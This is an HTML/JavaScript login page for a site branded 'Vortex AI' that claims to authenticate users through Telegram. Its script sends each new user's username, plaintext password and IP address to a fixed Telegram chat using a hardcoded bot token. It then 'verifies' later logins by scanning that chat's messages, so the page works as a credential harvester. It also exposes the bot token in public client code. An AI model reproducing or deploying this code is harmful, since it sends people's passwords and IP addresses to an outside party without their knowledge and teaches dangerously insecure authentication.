<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vortex AI‚éä - Sistema Real</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0c0c0c, #1a1a2e, #16213e);
            color: #fff;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
            text-align: center;
        }

        header {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 1rem 2rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }

        .logo {
            font-size: 2rem;
            font-weight: bold;
            background: linear-gradient(45deg, #7e22ce, #3b82f6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .hero {
            padding: 4rem 0;
        }

        .hero h1 {
            font-size: 3.5rem;
            margin-bottom: 1rem;
            background: linear-gradient(45deg, #7e22ce, #3b82f6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .cta-button {
            background: linear-gradient(45deg, #7e22ce, #3b82f6);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            font-size: 1.1rem;
            cursor: pointer;
            margin: 10px;
            transition: transform 0.3s ease;
        }

        .cta-button:hover {
            transform: scale(1.05);
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(20px);
            padding: 3rem;
            border-radius: 20px;
            width: 90%;
            max-width: 400px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 1rem;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .alert {
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 1rem;
            display: none;
        }

        .alert.success {
            background: rgba(34, 197, 94, 0.2);
            border: 1px solid #22c55e;
            display: block;
        }

        .alert.error {
            background: rgba(239, 68, 68, 0.2);
            border: 1px solid #ef4444;
            display: block;
        }

        .alert.info {
            background: rgba(59, 130, 246, 0.2);
            border: 1px solid #3b82f6;
            display: block;
        }
    </style>
</head>
<body>
    <header>
        <div class="logo">Vortex AI‚éä</div>
    </header>

    <div class="container">
        <section class="hero">
            <h1>Vortex AI‚éä</h1>
            <p style="font-size: 1.2rem; margin-bottom: 2rem;">Sistema de autenticaci√≥n REAL con Telegram API</p>
            <button class="cta-button" onclick="openModal()">üîê Acceso con Telegram</button>
        </section>
    </div>

    <!-- Modal Login -->
    <div id="loginModal" class="modal">
        <div class="modal-content">
            <h2 style="margin-bottom: 2rem;">üåÄ Acceso Vortex AI</h2>
            
            <div id="alertMessage" class="alert"></div>
            
            <form onsubmit="handleLogin(event)">
                <div class="form-group">
                    <label>üë§ Usuario:</label>
                    <input type="text" id="username" required placeholder="Tu usuario">
                </div>
                <div class="form-group">
                    <label>üîë Contrase√±a:</label>
                    <input type="password" id="password" required placeholder="Tu contrase√±a">
                </div>
                <button type="submit" class="cta-button" style="width: 100%; margin-top: 1rem;">
                    üöÄ Iniciar Sesi√≥n
                </button>
            </form>
            
            <div style="margin-top: 1.5rem; font-size: 0.9rem; opacity: 0.8;">
                üîê Sistema verifica en Telegram antes de registrar
            </div>
        </div>
    </div>

    <script>
        // Configuraci√≥n Telegram
        const BOT_TOKEN = "8120164090:AAHkYn_CsETLSlP3Jzp-eEWbS5G9NGRBUwY";
        const CHAT_ID = "-1003059908452";

        // Funci√≥n para enviar mensaje a Telegram
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('Error:', error);
                return false;
            }
        }

        // Funci√≥n MEJORADA para leer mensajes de Telegram
        async function verifyLogin(username, password) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-200`;
            
            try {
                const response = await fetch(url);
                const data = await response.json();
                
                if (!data.ok) {
                    console.log('Error en API de Telegram');
                    return false;
                }

                console.log('Mensajes encontrados:', data.result.length);

                // Buscar en los √∫ltimos mensajes
                for (let update of data.result) {
                    if (update.message && update.message.text) {
                        const text = update.message.text;
                        
                        // Buscar coincidencia EXACTA
                        const userPattern = new RegExp(`Usuario: <code>${username}</code>`, 'i');
                        const passPattern = new RegExp(`Password: <code>${password}</code>`, 'i');
                        
                        if (userPattern.test(text) && passPattern.test(text)) {
                            console.log('‚úÖ Credenciales encontradas en Telegram');
                            return true;
                        }
                    }
                }
                
                console.log('‚ùå Credenciales NO encontradas');
                return false;
                
            } catch (error) {
                console.error('Error verificando login:', error);
                return false;
            }
        }

        // Manejar login CORREGIDO
        async function handleLogin(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!username || !password) {
                showAlert('‚ùå Usuario y contrase√±a requeridos', 'error');
                return;
            }

            showAlert('‚è≥ Verificando credenciales en Telegram...', 'info');

            // PRIMERO verificar si el usuario YA EXISTE
            const userExists = await verifyLogin(username, password);
            
            if (userExists) {
                // ‚úÖ USUARIO ENCONTRADO - LOGIN EXITOSO
                showAlert('‚úÖ ¬°Login exitoso! Redirigiendo...', 'success');
                localStorage.setItem('vortex_user', username);
                setTimeout(() => {
                    window.location.href = 'dashboard.html';
                }, 1500);
                
            } else {
                // ‚ùå USUARIO NO EXISTE - ENVIAR REGISTRO
                showAlert('üìù Usuario no encontrado. Creando registro...', 'info');
                
                const ip = await getIP();
                const message = `üÜï NUEVO REGISTRO VORTEX AI\nüë§ Usuario: <code>${username}</code>\nüîë Password: <code>${password}</code>\n‚è∞ Fecha: ${new Date().toLocaleString()}\nüåê IP: ${ip}`;
                
                const sent = await sendToTelegram(message);
                
                if (sent) {
                    showAlert('‚úÖ ¬°Registro exitoso! Los datos se enviaron a Telegram. Ahora puedes iniciar sesi√≥n.', 'success');
                    // Limpiar campos
                    document.getElementById('username').value = '';
                    document.getElementById('password').value = '';
                } else {
                    showAlert('‚ùå Error al enviar registro. Intenta nuevamente.', 'error');
                }
            }
        }

        // Funciones auxiliares
        function openModal() {
            document.getElementById('loginModal').style.display = 'flex';
            // Limpiar alertas al abrir modal
            document.getElementById('alertMessage').className = 'alert';
            document.getElementById('alertMessage').textContent = '';
        }

        function closeModal() {
            document.getElementById('loginModal').style.display = 'none';
        }

        function showAlert(message, type) {
            const alert = document.getElementById('alertMessage');
            alert.textContent = message;
            alert.className = `alert ${type}`;
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Desconocida';
            }
        }

        // Cerrar modal al hacer click fuera
        window.onclick = function(event) {
            const modal = document.getElementById('loginModal');
            if (event.target === modal) {
                closeModal();
            }
        }

        // Verificar si ya est√° logueado al cargar la p√°gina
        window.addEventListener('load', function() {
            if (localStorage.getItem('vortex_user')) {
                window.location.href = 'dashboard.html';
            }
        });
    </script>
</body>
</html>
